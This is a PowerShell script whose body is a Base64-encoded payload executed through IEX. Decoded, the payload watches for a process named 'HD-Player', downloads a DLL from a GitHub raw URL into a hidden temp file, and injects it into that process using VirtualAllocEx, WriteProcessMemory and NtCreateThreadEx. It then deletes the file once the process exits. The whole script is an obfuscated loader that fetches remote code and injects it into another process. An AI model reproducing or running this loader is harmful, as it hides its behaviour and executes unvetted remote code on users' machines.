$enc1 = "IyBXaW5BUEkgYmluZGluZ3MNCiRzaWduYXR1cmUgPSBAIg0KdXNpbmcgU3lzdGVtOw0KdXNpbmcgU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzOw0KDQpwdWJsaWMgY2xhc3MgV2luMzIgew0KICAgIFtEbGxJbXBvcnQoImtlcm5lbDMyLmRsbCIsIFNldExhc3RFcnJvciA9IHRydWUpXQ0KICAgIHB1YmxpYyBzdGF0aWMgZXh0ZXJuIEludFB0ciBPcGVuUHJvY2VzcyhpbnQgZHdEZXNpcmVkQWNjZXNzLCBib29sIGJJbmhlcml0SGFuZGxlLCBpbnQgZHdQcm9jZXNzSWQpOw0KDQogICAgW0RsbEltcG9ydCgia2VybmVsMzIuZGxsIiwgU2V0TGFzdEVycm9yID0gdHJ1ZSldDQogICAgcHVibGljIHN0YXRpYyBleHRlcm4gSW50UHRyIFZpcnR1YWxBbGxvY0V4KEludFB0ciBoUHJvY2VzcywgSW50UHRyIGxwQWRkcmVzcywgdWludCBkd1NpemUsIHVpbnQgZmxBbGxvY2F0aW9uVHlwZSwgdWludCBmbFByb3RlY3QpOw0KDQogICAgW0RsbEltcG9ydCgia2VybmVsMzIuZGxsIiwgU2V0TGFzdEVycm9yID0gdHJ1ZSldDQogICAgcHVibGljIHN0YXRpYyBleHRlcm4gYm9vbCBXcml0ZVByb2Nlc3NNZW1vcnkoSW50UHRyIGhQcm9jZXNzLCBJbnRQdHIgbHBCYXNlQWRkcmVzcywgYnl0ZVtdIGxwQnVmZmVyLCB1aW50IG5TaXplLCBvdXQgdWludCBscE51bWJlck9mQnl0ZXNXcml0dGVuKTsNCg0KICAgIFtEbGxJbXBvcnQoImtlcm5lbDMyLmRsbCIsIFNldExhc3RFcnJvciA9IHRydWUpXQ0KICAgIHB1YmxpYyBzdGF0aWMgZXh0ZXJuIEludFB0ciBHZXRNb2R1bGVIYW5kbGUoc3RyaW5nIGxwTW9kdWxlTmFtZSk7DQoNCiAgICBbRGxsSW1wb3J0KCJrZXJuZWwzMi5kbGwiLCBTZXRMYXN0RXJyb3IgPSB0cnVlKV0NCiAgICBwdWJsaWMgc3RhdGljIGV4dGVybiBJbnRQdHIgR2V0UHJvY0FkZHJlc3MoSW50UHRyIGhNb2R1bGUsIHN0cmluZyBscFByb2NOYW1lKTsNCg0KICAgIFtEbGxJbXBvcnQoIm50ZGxsLmRsbCIsIFNldExhc3RFcnJvciA9IHRydWUpXQ0KICAgIHB1YmxpYyBzdGF0aWMgZXh0ZXJuIHVpbnQgTnRDcmVhdGVUaHJlYWRFeChvdXQgSW50UHRyIHRocmVhZEhhbmRsZSwgdWludCBkZXNpcmVkQWNjZXNzLCBJbnRQdHIgb2JqZWN0QXR0cmlidXRlcywNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgSW50UHRyIHByb2Nlc3NIYW5kbGUsIEludFB0ciBzdGFydEFkZHJlc3MsIEludFB0ciBwYXJhbWV0ZXIsIA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBib29sIGNyZWF0ZVN1c3BlbmRlZCwgaW50IHplcm9CaXRzLCBpbnQgc3RhY2tTaXplLCBpbnQgbWF4aW11bVN0YWNrU2l6ZSwgSW50UHRyIGF0dHJpYnV0ZUxpc3QpOw0KfQ0KIkANCkFkZC1UeXBlIC1UeXBlRGVmaW5pdGlvbiAkc2lnbmF0dXJlIC1QYXNzVGhydQ0KDQpmdW5jdGlvbiBHZXQtVGFyZ2V0UHJvY2Vzc0lkKCRuYW1lKSB7DQogICAgJHByb2MgPSBHZXQtUHJvY2VzcyB8IFdoZXJlLU9iamVjdCB7ICRfLlByb2Nlc3NOYW1lIC1saWtlICRuYW1lIH0NCiAgICByZXR1cm4gJHByb2MuSWQNCn0NCg0KIyBDb25maWcNCiRkbGxVcmwgPSAiaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL1NocmV5YXNnbGl0Y2gvcHMvbWFpbi90ZXN0LmRsbCINCiRQUk9DRVNTX0FMTF9BQ0NFU1MgPSAweDFGMEZGRg0KJE1FTV9DT01NSVQgPSAweDEwMDANCiRNRU1fUkVTRVJWRSA9IDB4MjAwMA0KJFBBR0VfRVhFQ1VURV9SRUFEV1JJVEUgPSAweDQwDQokaW5qZWN0ZWRPbmNlID0gJGZhbHNlDQokdGVtcFBhdGggPSAiIg0KDQp3aGlsZSAoJHRydWUpIHsNCiAgICAkdGFyZ2V0UGlkID0gR2V0LVRhcmdldFByb2Nlc3NJZCAiSEQtUGxheWVyIg0KDQogICAgaWYgKCR0YXJnZXRQaWQgLWFuZCAtbm90ICRpbmplY3RlZE9uY2UpIHsNCiAgICAgICAgV3JpdGUtSG9zdCAiWytdIEhELVBsYXllciBmb3VuZCAoUElEOiAkdGFyZ2V0UGlkKSINCiAgICAgICAgJGhQcm9jZXNzID0gW1dpbjMyXTo6T3BlblByb2Nlc3MoJFBST0NFU1NfQUxMX0FDQ0VTUywgJGZhbHNlLCAkdGFyZ2V0UGlkKQ0KDQogICAgICAgIGlmICgkaFByb2Nlc3MgLW5lIDApIHsNCiAgICAgICAgICAgIHRyeSB7DQogICAgICAgICAgICAgICAgJHdlYmNsaWVudCA9IE5ldy1PYmplY3QgU3lzdGVtLk5ldC5XZWJDbGllbnQNCiAgICAgICAgICAgICAgICAkZGxsQnl0ZXMgPSAkd2ViY2xpZW50LkRvd25sb2FkRGF0YSgkZGxsVXJsKQ0KDQogICAgICAgICAgICAgICAgJHRlbXBQYXRoID0gW1N5c3RlbS5JTy5QYXRoXTo6Q29tYmluZSgkZW52OlRFTVAsIFtTeXN0ZW0uSU8uUGF0aF06OkdldFJhbmRvbUZpbGVOYW1lKCkgKyAiLmRsbCIpDQogICAgICAgICAgICAgICAgW1N5c3RlbS5JTy5GaWxlXTo6V3JpdGVBbGxCeXRlcygkdGVtcFBhdGgsICRkbGxCeXRlcykNCiAgICAgICAgICAgICAgICAoR2V0LUl0ZW0gJHRlbXBQYXRoKS5BdHRyaWJ1dGVzID0gIkhpZGRlbiINCiAgICAgICAgICAgICAgICBXcml0ZS1Ib3N0ICJbK10gRExMIGRvd25sb2FkZWQgdG8gJHRlbXBQYXRoIg0KDQogICAgICAgICAgICAgICAgJGRsbFBhdGhCeXRlcyA9IFtTeXN0ZW0uVGV4dC5FbmNvZGluZ106OkFTQ0lJLkdldEJ5dGVzKCR0ZW1wUGF0aCArIFtjaGFyXTApDQogICAgICAgICAgICAgICAgJGFsbG9jTWVtID0gW1dpbjMyXTo6VmlydHVhbEFsbG9jRXgoJGhQcm9jZXNzLCBbSW50UHRyXTo6WmVybywgJGRsbFBhdGhCeXRlcy5MZW5ndGgsICRNRU1fQ09NTUlUIC1ib3IgJE1FTV9SRVNFUlZFLCAkUEFHRV9FWEVDVVRFX1JFQURXUklURSkNCg0KICAgICAgICAgICAgICAgIGlmICgkYWxsb2NNZW0gLW5lIDApIHsNCiAgICAgICAgICAgICAgICAgICAgW1dpbjMyXTo6V3JpdGVQcm9jZXNzTWVtb3J5KCRoUHJvY2VzcywgJGFsbG9jTWVtLCAkZGxsUGF0aEJ5dGVzLCAkZGxsUGF0aEJ5dGVzLkxlbmd0aCwgW3JlZl0wKQ0KDQogICAgICAgICAgICAgICAgICAgICRoS2VybmVsMzIgPSBbV2luMzJdOjpHZXRNb2R1bGVIYW5kbGUoImtlcm5lbDMyLmRsbCIpDQogICAgICAgICAgICAgICAgICAgICRsb2FkTGlicmFyeSA9IFtXaW4zMl06OkdldFByb2NBZGRyZXNzKCRoS2VybmVsMzIsICJMb2FkTGlicmFyeUEiKQ0KDQogICAgICAgICAgICAgICAgICAgIFtJbnRQdHJdJGhUaHJlYWQgPSBbSW50UHRyXTo6WmVybw0KICAgICAgICAgICAgICAgICAgICAkcmVzdWx0ID0gW1dpbjMyXTo6TnRDcmVhdGVUaHJlYWRFeChbcmVmXSRoVGhyZWFkLCAweDFGRkZGRiwgW0ludFB0cl06Olplcm8sICRoUHJvY2VzcywgJGxvYWRMaWJyYXJ5LCAkYWxsb2NNZW0sICRmYWxzZSwgMCwgMCwgMCwgW0ludFB0cl06Olplcm8pDQoNCiAgICAgICAgICAgICAgICAgICAgaWYgKCRyZXN1bHQgLWVxIDApIHsNCiAgICAgICAgICAgICAgICAgICAgICAgIFdyaXRlLUhvc3QgIlsrXSBETEwgSW5qZWN0ZWQgU3VjY2Vzc2Z1bGx5Ig0KICAgICAgICAgICAgICAgICAgICAgICAgJGluamVjdGVkT25jZSA9ICR0cnVlDQogICAgICAgICAgICAgICAgICAgIH0gZWxzZSB7DQogICAgICAgICAgICAgICAgICAgICAgICBXcml0ZS1Ib3N0ICJbLV0gSW5qZWN0aW9uIGZhaWxlZC4gQ29kZTogJHJlc3VsdCINCiAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgIH0NCg0KICAgICAgICAgICAgfSBjYXRjaCB7DQogICAgICAgICAgICAgICAgV3JpdGUtSG9zdCAiWy1dIEVycm9yIGR1cmluZyBkb3dubG9hZC9pbmplY3Rpb246ICQoJF8uRXhjZXB0aW9uLk1lc3NhZ2UpIg0KICAgICAgICAgICAgfQ0KICAgICAgICB9DQogICAgfQ0KDQogICAgaWYgKC1ub3QgJHRhcmdldFBpZCAtYW5kICRpbmplY3RlZE9uY2UpIHsNCiAgICAgICAgV3JpdGUtSG9zdCAiW35dIEhELVBsYXllciBjbG9zZWQuIENsZWFuaW5nIHVwIERMTC4uLiINCg0KICAgICAgICB0cnkgew0KICAgICAgICAgICAgaWYgKFRlc3QtUGF0aCAkdGVtcFBhdGgpIHsNCiAgICAgICAgICAgICAgICBbU3lzdGVtLklPLkZpbGVdOjpTZXRBdHRyaWJ1dGVzKCR0ZW1wUGF0aCwgJ05vcm1hbCcpDQogICAgICAgICAgICAgICAgUmVtb3ZlLUl0ZW0gJHRlbXBQYXRoIC1Gb3JjZQ0KICAgICAgICAgICAgICAgIFdyaXRlLUhvc3QgIlsrXSBETEwgZmlsZSBkZWxldGVkIGFmdGVyIHByb2Nlc3MgZXhpdC4iDQogICAgICAgICAgICB9DQogICAgICAgIH0gY2F0Y2ggew0KICAgICAgICAgICAgV3JpdGUtSG9zdCAiWy1dIEZhaWxlZCB0byBkZWxldGUgRExMIG9uIGV4aXQ6ICQoJF8uRXhjZXB0aW9uLk1lc3NhZ2UpIg0KICAgICAgICB9DQoNCiAgICAgICAgJGluamVjdGVkT25jZSA9ICRmYWxzZQ0KICAgICAgICAkdGVtcFBhdGggPSAiIg0KICAgIH0NCg0KICAgIFN0YXJ0LVNsZWVwIC1TZWNvbmRzIDUNCn0NCg=="
IEX ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($enc1)))
